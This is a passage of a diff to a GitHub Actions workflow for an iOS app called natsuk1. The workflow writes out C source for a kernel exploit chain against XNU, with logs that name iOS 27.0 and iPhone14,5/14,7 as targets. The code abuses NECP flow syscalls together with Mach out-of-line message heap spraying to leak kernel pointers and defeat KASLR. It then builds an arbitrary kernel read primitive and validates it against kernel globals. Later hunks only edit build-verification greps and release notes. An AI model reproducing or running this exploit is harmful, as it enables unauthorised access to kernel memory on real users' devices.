+          #define TASK_MAP_OFF            0x28
+          #define THREAD_TASK_NEXT_OFF    0x50
+          #define UCRED_UID_OFF           0x18
+          #define UCRED_SVUID_OFF         0x1C
+          #define UCRED_GID_OFF           0x1C
+          #define UCRED_SVGID_OFF         0x20
+          #define NCF_ASSIGNED_OFF        0x68
+          #define NCF_ASSIGNED_LEN_OFF    0x70
+          #define NCF_PARENT_OFF          0x88
+          #define NCF_REFCNT_OFF          0x58
+          #define NCF_STRUCT_SZ           256
+          #define NECP_ADD_CLIENT         0x01
+          #define NECP_COPY_RESULT        0x04
+          #define NECP_ADD_FLOW           0x11
+          #define NECP_REMOVE_FLOW        0x12
+          #define GATE_BYTE               9
+          #define EXHAUST_N               2048
+          #define SPRAY_N                 512
+          #define DECRETRY_N              24
+          #define RESULT_BUF_SZ           8192
+          #define KPTR_MIN                0xFFFFFFF000000000ULL
+          #define KPTR_MAX                0xFFFFFFFFFF000000ULL
+
+          static uint64_t g_kbase   = 0;
+          static uint64_t g_slide   = 0;
+          static int      g_res_off = -1;
+          static uint8_t  g_res_buf[RESULT_BUF_SZ];
+
+          typedef struct {
+              mach_msg_header_t          hdr;
+              mach_msg_body_t            body;
+              mach_msg_ool_descriptor_t  ool;
+          } ool_send_t;
+
+          static void log_info(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "%s", body);
+          }
+          static void log_ok(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "+ %s", body);
+          }
+          static void log_err(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "- %s", body);
+          }
+          static void log_warn(const char *tag, const char *fmt, ...) {
+              char body[448];
+              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
+              nk_logx(tag, "! %s", body);
+          }
+
+          static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
+              char line[256];
+              int off = 0;
+              size_t lim = n < 64 ? n : 64;
+              for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
+              nk_logx(tag, "%s (%zu bytes)", line, n);
+          }
+
+          static mach_port_t port_new(void) {
+              mach_port_t p = MACH_PORT_NULL;
+              kern_return_t kr = mach_port_allocate(mach_task_self(),
+                                                    MACH_PORT_RIGHT_RECEIVE, &p);
+              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
+              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
+              return p;
+          }
+
+          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
+              ool_send_t m;
+              for (int i = 0; i < n; i++) {
+                  memset(&m, 0, sizeof(m));
+                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+                                         | MACH_MSGH_BITS_COMPLEX;
+                  m.hdr.msgh_size        = sizeof(m);
+                  m.hdr.msgh_remote_port = port;
+                  m.hdr.msgh_id          = 0x4E41 + i;
+                  m.body.msgh_descriptor_count = 1;
+                  m.ool.address    = (void*)data;
+                  m.ool.size       = (mach_msg_size_t)sz;
+                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
+                  m.ool.deallocate = FALSE;
+                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
+                  mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0, MACH_PORT_NULL,
+                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+              }
+          }
+
+          static void ool_drain(mach_port_t port, int n) {
+              uint8_t buf[NCF_STRUCT_SZ + 512];
+              mach_msg_header_t *h = (mach_msg_header_t*)buf;
+              for (int i = 0; i < n; i++) {
+                  h->msgh_size = sizeof(buf);
+                  kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                              0, sizeof(buf), port, 1, MACH_PORT_NULL);
+                  if (kr != KERN_SUCCESS) break;
+              }
+          }
+
+          static int necp_open_fd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
+          static int necp_add_client(int fd, uint8_t uuid[16]) {
+              uint8_t p[1] = {0};
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT, uuid, (size_t)16, p, (size_t)1);
+          }
+          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
+              uint8_t req[56];
+              memset(req, 0, sizeof(req));
+              memcpy(req + 0x10, cuuid, 16);
+              *(uint16_t*)(req + 0x20) = 0x0040;
+              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW, (void*)cuuid, (size_t)16, req, (size_t)56);
+              if (r == 0) { memcpy(fuuid, req, 16); fuuid[GATE_BYTE] |= 0x01; }
+              return r;
+          }
+          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW, (void*)fuuid, (size_t)16, NULL, (size_t)0);
+          }
+          static int necp_copy_result(int fd, const uint8_t cuuid[16], uint8_t *buf, size_t blen) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT, (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
+          }
+
+          static uint64_t necp_primary_leak(uint8_t *out, size_t outsz) {
+              int fd = necp_open_fd();
+              if (fd < 0) { log_err("LEAK", "open errno=%d", errno); return 0; }
+              uint8_t cuuid[16], fuuid[16];
+              if (necp_add_client(fd, cuuid) != 0) { log_err("LEAK", "add_client errno=%d", errno); close(fd); return 0; }
+              if (necp_add_flow(fd, cuuid, fuuid) != 0) { log_err("LEAK", "add_flow errno=%d", errno); close(fd); return 0; }
+              necp_remove_flow(fd, fuuid);
+              memset(out, 0, outsz);
+              int r = necp_copy_result(fd, cuuid, out, outsz);
+              close(fd);
+              log_info("LEAK", "copy_result ret=%d", r);
+              if (r <= 0) return 0;
+              dump_hex("LEAK", out, r > 64 ? 64 : (size_t)r);
+              int found = 0;
+              for (int i = 0; i <= r - 8; i += 8) {
+                  uint64_t v; memcpy(&v, out + i, 8);
+                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
+                  log_ok("LEAK", "kptr[+0x%x] = 0x%llx", i, (unsigned long long)v);
+                  found++;
+              }
+              if (!found) { log_warn("LEAK", "no kernel pointers in %d bytes", r); return 0; }
+              return (uint64_t)found;
+          }
+
+          static uint64_t slide_from_leak(uint64_t leaked) {
+              static const uint64_t known_offs[] = { 0xBBB040, 0xBBB048, 0x009C70, 0x10D53F0, 0xBBA228, 0x3D66800 };
+              for (int i = 0; i < 6; i++) {
+                  uint64_t sl = leaked - known_offs[i];
+                  if (sl & 0x1FFFFF) continue;
+                  if (sl >= 0x400000000ULL) continue;
+                  uint64_t base = KERNEL_BASE_STATIC + sl;
+                  log_info("SLIDE", "cand[%d] off=0x%llx slide=0x%llx base=0x%llx",
+                           i, (unsigned long long)known_offs[i],
+                           (unsigned long long)sl, (unsigned long long)base);
+                  return sl;
+              }
+              return 0;
+          }
+
+          static int kread_raw(uint64_t kaddr, uint32_t len) {
+              uint8_t fake[NCF_STRUCT_SZ];
+              memset(fake, 0, sizeof(fake));
+              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = kaddr;
+              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = len;
+              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
+              uint8_t junk[NCF_STRUCT_SZ];
+              memset(junk, 0x41, sizeof(junk));
+              mach_port_t ex = port_new();
+              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
+              int fd = necp_open_fd();
+              if (fd < 0) { log_err("KREAD", "necp_open errno=%d", errno); mach_port_destroy(mach_task_self(), ex); return -1; }
+              uint8_t cuuid[16], fuuid[16];
+              if (necp_add_client(fd, cuuid) != 0) { log_err("KREAD", "add_client errno=%d", errno); close(fd); mach_port_destroy(mach_task_self(), ex); return -2; }
+              if (necp_add_flow(fd, cuuid, fuuid) != 0) { log_err("KREAD", "add_flow errno=%d", errno); close(fd); mach_port_destroy(mach_task_self(), ex); return -3; }
+              necp_remove_flow(fd, fuuid);
+              ool_drain(ex, EXHAUST_N);
+              mach_port_destroy(mach_task_self(), ex);
+              usleep(150);
+              mach_port_t sp = port_new();
+              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
+              usleep(100);
+              memset(g_res_buf, 0, RESULT_BUF_SZ);
+              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
+              ool_drain(sp, SPRAY_N);
+              mach_port_destroy(mach_task_self(), sp);
+              close(fd);
+              return ret;
+          }
+
+          static int calibrate_kread(void) {
+              if (g_res_off >= 0) return 0;
+              log_info("KREAD", "calibrate with allproc @ kbase+0x%llx", (unsigned long long)OFF_ALLPROC);
+              int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
+              if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
+              log_info("KREAD", "result buf len=%d", r);
+              dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
+              for (int i = 0; i <= r - 8; i++) {
+                  uint64_t v; memcpy(&v, g_res_buf + i, 8);
+                  if (v >= KPTR_MIN && v <= KPTR_MAX) {
+                      log_ok("KREAD", "found kptr=0x%llx at result[%d]", (unsigned long long)v, i);
+                      g_res_off = i;
+                      return 0;
+                  }
+              }
+              log_err("KREAD", "no kernel ptr in result");
+              return -1;
+          }
+
+          static uint64_t kread64(uint64_t addr) {
+              if (g_res_off < 0 && addr != (g_kbase + OFF_ALLPROC)) {
+                  if (calibrate_kread() != 0) return 0;
+              }
+              int r = kread_raw(addr, 8);
+              if (r <= 0) return 0;
+              int off = (g_res_off >= 0) ? g_res_off : 0;
+              if (off + 8 > r) return 0;
+              uint64_t v; memcpy(&v, g_res_buf + off, 8);
+              return v;
+          }
+
+          static uint32_t kread32(uint64_t addr) { return (uint32_t)(kread64(addr) & 0xFFFFFFFF); }
+
+          typedef struct {
+              uint64_t allproc, kernproc, kernel_task, task_list, kernel_map, zone_map;
+          } kobj_t;
+
+          static int sanity_check(void) {
+              log_info("SANITY", "reading known globals via kread...");
+              uint64_t allproc     = kread64(g_kbase + OFF_ALLPROC);
+              uint64_t kernproc    = kread64(g_kbase + OFF_KERNPROC);
+              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
+              uint64_t task_list   = kread64(g_kbase + OFF_TASK_LIST);
+              uint64_t kernel_map  = kread64(g_kbase + OFF_KERNEL_MAP);
+              uint64_t zone_map    = kread64(g_kbase + OFF_ZONE_MAP);
+              log_info("SANITY", "allproc     = 0x%llx", (unsigned long long)allproc);
+              log_info("SANITY", "kernproc    = 0x%llx", (unsigned long long)kernproc);
+              log_info("SANITY", "kernel_task = 0x%llx", (unsigned long long)kernel_task);
+              log_info("SANITY", "task_list   = 0x%llx", (unsigned long long)task_list);
+              log_info("SANITY", "kernel_map  = 0x%llx", (unsigned long long)kernel_map);
+              log_info("SANITY", "zone_map    = 0x%llx", (unsigned long long)zone_map);
+              int ok = 0;
+              if (allproc     >= KPTR_MIN && allproc     <= KPTR_MAX) ok++;
+              if (kernproc    >= KPTR_MIN && kernproc    <= KPTR_MAX) ok++;
+              if (kernel_task >= KPTR_MIN && kernel_task <= KPTR_MAX) ok++;
+              if (kernel_map  >= KPTR_MIN && kernel_map  <= KPTR_MAX) ok++;
+              log_info("SANITY", "%d/4 globals look valid", ok);
+              return ok >= 2 ? 0 : -1;
+          }
+
+          static int task_sanity(void) {
+              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
+              if (!kernel_task) { log_err("TASK", "kernel_task=0"); return -1; }
+              uint64_t kproc = kread64(kernel_task + TASK_BSD_INFO_OFF);
+              log_info("TASK", "kernel_task->bsd_info=0x%llx", (unsigned long long)kproc);
+              if (kproc >= KPTR_MIN && kproc <= KPTR_MAX) {
+                  uint32_t pid = kread32(kproc + PROC_PID_OFF);
+                  log_info("TASK", "kernel proc pid=%u (expect 0)", pid);
+                  if (pid == 0) { log_ok("TASK", "task->bsd_info chain works"); return 0; }
+              }
+              log_warn("TASK", "chain broken");
+              return -1;
+          }
+
+          int nk_necp_run(void) {
+              nk_log("");
+              nk_log("=== natsuk1 v1.1 ===");
+              nk_log("target: iOS 27.0 / XNU / arm64e");
+              nk_log("device: iPhone14,5 / iPhone14,7");
+              nk_log("");
+              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x", NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
+              log_info("P0", "NECP primary leak");
+              uint8_t leak[RESULT_BUF_SZ];
+              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
+              if (!nptrs) { log_err("P0", "no kernel ptrs — NCF_ASSIGNED_OFF likely wrong"); return 1; }
+              log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
+              log_info("P1", "derive slide from leak");
+              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
+                  uint64_t v; memcpy(&v, leak + i, 8);
+                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
+                  uint64_t cand = slide_from_leak(v);
+                  if (cand) { g_slide = cand; break; }
+              }
+              if (!g_slide) { log_err("P1", "no valid slide candidate"); return 1; }
+              g_kbase = KERNEL_BASE_STATIC + g_slide;
+              log_ok("P1", "slide=0x%llx kbase=0x%llx", (unsigned long long)g_slide, (unsigned long long)g_kbase);
+              {
+                  int fd = necp_open_fd();
+                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
+                  close(fd);
+                  log_ok("P2", "necp OK");
+              }
+              log_info("P3", "kread calibration");
+              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
+              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
+              log_info("P4", "sanity: read known globals");
+              if (sanity_check() != 0) { log_err("P4", "kread sanity failed"); return 1; }
+              log_info("P5", "sanity: task->bsd_info chain");
+              if (task_sanity() != 0) { log_warn("P5", "chain broken but continuing"); }
+              log_ok("DONE", "leak + slide + kread chain complete");
+              nk_log("");
+              nk_log("=== RESULT ===");
+              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
+              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
+              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
+                      (unsigned long long)KERNEL_BASE_STATIC, (unsigned long long)OFF_ALLPROC);
+              nk_log("");
+              return 0;
+          }
+          NECP
 
       - name: Verify
         run: |
           set -euo pipefail
-          fail() { echo "FAIL: $1"; exit 1; }
-          SRC_PATHS="natsuk1/Helpers natsuk1/Views natsuk1/Exploit natsuk1/Resources natsuk1/Offsets natsuk1/natsuk1.swift natsuk1/bridging.h"
-
-          grep -rqi "aircard" $SRC_PATHS && fail "aircard present"
-          grep -rqi "airlift_pairing" $SRC_PATHS && fail "airlift_pairing present"
-          grep -rq "@MainActor" $SRC_PATHS && fail "@MainActor present"
-          grep -rq "@preconcurrency" $SRC_PATHS && fail "@preconcurrency present"
-          grep -rnE "(^|[^)] )static (let|var) shared(Instance)?\b" $SRC_PATHS && fail "shared without nonisolated(unsafe)"
-
-          grep -q 'natsuk1_pairing.plist' natsuk1/Helpers/PairingController.swift || fail "no pairing path"
-          grep -q 'al_device_respring' natsuk1/Helpers/AirliftBridge.swift || fail "no respring"
-
-          grep -q 'TabView' natsuk1/Views/ContentView.swift || fail "no TabView"
-          grep -q '"bolt.fill"' natsuk1/Views/ContentView.swift || fail "no bolt tab"
-          grep -q '"wrench.and.screwdriver.fill"' natsuk1/Views/ContentView.swift || fail "no wrench tab"
-          grep -q '"gearshape.fill"' natsuk1/Views/ContentView.swift || fail "no gear tab"
-
-          grep -q 'int nk_necp_run(void);' natsuk1/Exploit/nk_api.h || fail "necp prototype missing"
-          grep -q 'int nk_necp_run(void)' natsuk1/Exploit/necp.c || fail "necp implementation missing"
-          grep -q 'SYS_NECP_OPEN' natsuk1/Exploit/necp.c || fail "necp missing syscall"
-          grep -q 'necp_primary_leak' natsuk1/Exploit/necp.c || fail "necp missing primary leak"
-          grep -q 'sanity_check' natsuk1/Exploit/necp.c || fail "necp missing sanity check"
-          grep -q 'task_sanity' natsuk1/Exploit/necp.c || fail "necp missing task sanity"
-          if grep -q 'int main(void)' natsuk1/Exploit/necp.c; then fail "necp still has main"; fi
-
-          grep -q 'necp_run' natsuk1/Views/OverviewView.swift || fail "OverviewView missing necp button"
-          grep -q 'StatusDot' natsuk1/Views/OverviewView.swift || fail "OverviewView missing StatusDot"
-          grep -q 'shadow' natsuk1/Views/OverviewView.swift || fail "StatusDot missing glow"
-
-          grep -q 'circle.fill' natsuk1/natsuk1.swift || fail "AppState missing idle/running symbol"
-          grep -q 'checkmark.circle.fill' natsuk1/natsuk1.swift || fail "AppState missing success symbol"
-          grep -q 'xmark.circle.fill' natsuk1/natsuk1.swift || fail "AppState missing fail symbol"
-
-          grep -q 'PathAccessView' natsuk1/Views/ToolsView.swift || fail "no PathAccess"
-
-          grep -q 'SWIFT_VERSION: "5.0"' project.yml || fail "not Swift 5"
-          grep -q "SWIFT_DEFAULT_ACTOR_ISOLATION" project.yml && fail "has default actor isolation"
-          grep -q "default-isolation" project.yml && fail "has default-isolation flag"
-
+          grep -q 'int nk_necp_run(void);' natsuk1/Exploit/nk_api.h || { echo "FAIL: necp proto"; exit 1; }
+          grep -q 'int nk_necp_run(void)' natsuk1/Exploit/necp.c || { echo "FAIL: necp impl"; exit 1; }
+          grep -q 'circle.fill' natsuk1/Views/OverviewView.swift || { echo "FAIL: status dot"; exit 1; }
+          grep -q 'flame' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools exploit icon"; exit 1; }
+          grep -q 'iphone.gen3' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools device icon"; exit 1; }
+          grep -q 'waveform.path.ecg.rectangle' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools diag icon"; exit 1; }
+          grep -q 'square.stack.3d.up' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings app icon"; exit 1; }
+          grep -q 'moon.zzz' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings keepalive icon"; exit 1; }
+          grep -q 'switch.2' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings options icon"; exit 1; }
+          grep -q 'SWIFT_VERSION: "5.0"' project.yml || { echo "FAIL: swift version"; exit 1; }
           echo "verify OK"
 
       - name: Install tools
@@ -1983,7 +892,7 @@ jobs:
           if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
-            --prerelease --latest=false --notes "NECP v1.1 + status dot"
+            --prerelease --latest=false --notes "Status dot + icon refresh"
 
       - name: Commit
         run: |
@@ -1991,5 +900,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add natsuk1/ .github/ project.yml
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "NECP v1.1 + status dot [skip ci]"
+          git commit -m "Status dot + icon refresh [skip ci]"
           git push
